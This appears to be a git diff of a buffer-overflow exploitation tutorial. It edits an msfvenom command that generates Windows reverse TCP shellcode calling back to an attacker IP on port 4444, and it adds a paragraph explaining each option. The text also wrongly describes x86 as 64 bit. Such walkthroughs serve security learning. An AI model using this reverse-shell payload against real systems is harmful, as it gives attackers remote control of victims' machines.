@@ -257,6 +257,15 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
 **Moving Furture We will Generate the Reverse TCP shellcode to bypass the firewall if it is Anabled Type the follwing Command To gen erate the shellCode**
 <br  />
 
->msfvenom -p windows/shell_reverse_tcp LHOST=192.168.94.10 LPORT=4444 EXITFUNC=thread -b "\x00" -f python
+>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.94.10 LPORT=4444 EXITFUNC=thread -b "\x00" -a x86 -f python.
+
+![msfpayloadcreationforshellcode](https://user-images.githubusercontent.com/102399357/232208498-91abee64-75a7-43e9-83e7-0e9295e154ed.PNG)
+
+<br  />
+
+**Let Me Explain what the Above Command is Doing 1st it will Create -p which denotes Payload follwoed by windows reverse shell Now over hear we should put our Linux Ip adderss and Port Number As we will going to get reverse shell back from the victim. -b option stands for badchar in our case we found bad char as \x00 which is universal bad char follwed by -a which specifies arch of the system in my case it is x86 64 bit and finally generate my shell code in -f format  in python**
+
+
+<br  />
 
 
